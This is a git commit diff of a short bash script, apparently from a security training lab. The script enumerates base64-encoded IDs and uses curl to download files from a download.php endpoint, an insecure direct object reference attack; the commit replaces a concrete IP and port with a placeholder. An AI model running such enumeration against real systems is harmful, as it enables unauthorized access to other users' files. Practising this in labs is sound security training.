425f75d94dd30383ac7ed1e2a869b17bd12ae8e4
darkVip3r <60333738+bssolonka@users.noreply.github.com>
2024-07-28 20:29:50 +0100

    Update fileHashGrabber.sh

--- fileHashGrabber.sh
+++ fileHashGrabber.sh
@@ -2,6 +2,6 @@
 
 for i in {1..21}; do
     for hash in $(echo -n $i | base64 -w 0 | tr -d ' -'); do
-        curl -sOJ -X GET http://94.237.59.199:51836/download.php?contract=$hash
+        curl -sOJ -X GET http://IP:PORT/download.php?contract=$hash
     done
 done
